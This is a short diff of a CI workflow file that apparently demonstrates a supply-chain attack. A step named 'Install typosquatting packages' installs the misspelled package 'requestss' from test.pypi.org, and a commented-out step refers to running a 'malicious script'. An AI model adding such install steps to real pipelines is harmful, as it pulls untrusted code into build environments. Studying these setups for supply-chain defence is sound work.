@@ -30,7 +30,8 @@ jobs:
       #  run: pip install -r requirements.txt
 
       - name: Install typosquatting packages
-        run: pip install -i https://test.pypi.org/simple/ requestss
+        run: pip install -i https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple requestss
+
         
    #   - name: 😈 Execute malicious script
     #    run: bash run_malicious_scripts.sh
